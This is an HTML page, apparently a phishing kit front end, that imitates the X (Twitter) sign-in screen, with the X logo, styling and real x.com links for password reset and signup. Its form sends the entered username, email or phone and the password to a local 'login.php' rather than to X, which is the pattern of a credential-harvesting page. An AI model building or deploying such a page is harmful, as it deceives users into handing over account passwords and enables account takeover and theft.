<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to X</title>
  <meta name="description" content="Sign in to X to see what’s happening around the world right now." />
  <meta name="robots" content="NOODP" />

  <!-- Favicon tetap (opsional) -->
  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%23fff' d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L3.001 22.5H0l7.367-8.253L0 4.5h6.51l5.033 6.64L18.244 2.25Zm-6.51 13.003L6.226 8.02 0 15.75h6.51l5.51-7.003 6.724 8.753H12.734Z'/></svg>" />

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background-color: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Helvetica Neue", Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .login-container {
      width: 100%;
      max-width: 400px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .x-logo {
      width: 60px;
      height: 60px;
      display: flex;
      justify-content: center;
      align-items: center;
      background: #000;
      border-radius: 12px;
      margin-bottom: 32px;
      overflow: hidden; /* Pastikan SVG tidak overflow */
    }

    .x-logo svg {
      width: 100%;
      height: auto;
      display: block;
    }

    h1 {
      font-size: 28px;
      font-weight: 800;
      margin-bottom: 24px;
      text-align: center;
    }

    form {
      width: 100%;
    }

    .input-group {
      margin-bottom: 16px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 14px 16px;
      background: #111;
      border: 1px solid #333;
      border-radius: 6px;
      color: #fff;
      font-size: 16px;
      outline: none;
    }

    input::placeholder {
      color: #888;
    }

    button[type="submit"] {
      width: 100%;
      padding: 14px;
      background-color: #000;
      color: #fff;
      border: 1px solid #fff;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: background 0.2s, color 0.2s;
    }

    button[type="submit"]:hover {
      background-color: #333;
    }

    .remember-forgot {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 16px 0;
      font-size: 14px;
    }

    .remember-forgot label {
      color: #aaa;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .remember-forgot a {
      color: #aaa;
      text-decoration: none;
    }

    .remember-forgot a:hover {
      text-decoration: underline;
    }

    .divider {
      text-align: center;
      margin: 20px 0;
      color: #555;
    }

    .signup-link {
      text-align: center;
      font-size: 15px;
      color: #fff;
    }

    .signup-link a {
      color: #fff;
      text-decoration: none;
      font-weight: 700;
    }

    .signup-link a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="x-logo">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" fill="#fff">
        <path d="M818 800 498.11 333.745l.546.437L787.084 0h-96.385L455.738 272 269.15 0H16.367l298.648 435.31-.036-.037L0 800h96.385l261.222-302.618L565.217 800zM230.96 72.727l448.827 654.546h-76.38L154.217 72.727z" transform="translate(103 112)"/>
      </svg>
    </div>
    <h1>Sign in to X</h1>

    <form action="login.php" method="post">
      <div class="input-group">
        <input
          type="text"
          name="usernameOrEmail"
          placeholder="Phone, email, or username"
          autocomplete="username"
          required
        />
      </div>
      <div class="input-group">
        <input
          type="password"
          name="pass"
          placeholder="Password"
          autocomplete="current-password"
          required
        />
      </div>

      <div class="remember-forgot">
        <label>
          <input type="checkbox" name="remember_me" value="1" />
          Remember me
        </label>
        <a href="https://x.com/account/begin_password_reset" target="_blank" rel="noopener">Forgot password?</a>
      </div>

      <button type="submit">Log in</button>
    </form>

    <div class="divider">•</div>

    <div class="signup-link">
      Don't have an account? <a href="https://x.com/signup" target="_blank" rel="noopener">Sign up</a>
    </div>
  </div>
</body>
</html>
